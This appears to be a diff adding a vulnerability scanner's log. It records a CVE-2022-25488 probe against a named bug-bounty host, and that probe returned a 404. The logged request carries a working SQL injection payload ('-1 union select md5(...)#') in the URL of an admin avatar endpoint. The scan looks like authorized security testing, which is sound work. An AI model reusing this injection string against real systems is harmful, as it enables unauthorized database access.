@@ -1,0 +1,30 @@
+[CVE-2022-25488] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/ajax/avatar.php?id=-1+union+select+md5(999999999)%23
+
+
+GET /admin/ajax/avatar.php?id=-1+union+select+md5(999999999)%23 HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (CentOS; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2022-25488] Dumped HTTP response https://techsolutions.bitpanda.com/admin/ajax/avatar.php?id=-1+union+select+md5(999999999)%23
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 68a9f2dcbbd436308ba855514c015cf2.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: Nx0xfOoWT32SvEo1o-HKukxWoxfG63yEsNahBQU99k4Xcc1U04vuBA==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: Oxj1qPEfRFXmhnyVdSrO/Y/5raZW2Zl+H3ELN3Zdc8P8gU2yho2DDq04kuJm5lHbyxxsPwyKL7w+fHcXFq5yUKI4qDrJh0MZ
+X-Amz-Request-Id: VE5WVYDDCM09DG6H
+X-Cache: Error from cloudfront
+
+Not Found
